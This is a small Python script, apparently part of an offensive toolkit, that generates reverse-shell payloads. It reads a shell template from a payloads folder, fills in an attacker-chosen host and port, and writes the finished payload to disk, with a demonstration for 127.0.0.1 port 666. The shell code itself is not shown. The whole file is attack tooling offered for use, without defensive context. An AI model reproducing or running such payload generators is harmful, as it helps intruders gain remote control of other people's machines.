#!/usr/bin/env python3

class ReverseShellGenerator:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def gen_pyshell(self, output):
        file = open('payloads/rshell.py2.intermediate', 'r')
        fbuf = file.read()
        file.close()
        fbuf = fbuf.replace('HOLY_MOLY', self.host)
        fbuf = fbuf.replace('\'BATMAN\'', str(self.port))    # Replaces quotes too (hack for intermediary errors)
        outfile = open(output, 'w')
        outfile.write(fbuf)
        outfile.close()

if __name__ == '__main__':
    rshell = ReverseShellGenerator('127.0.0.1', 666)
    rshell.gen_pyshell('crafted_payloads/' + rshell.host + '-' + str(rshell.port) + '-rshell.py')
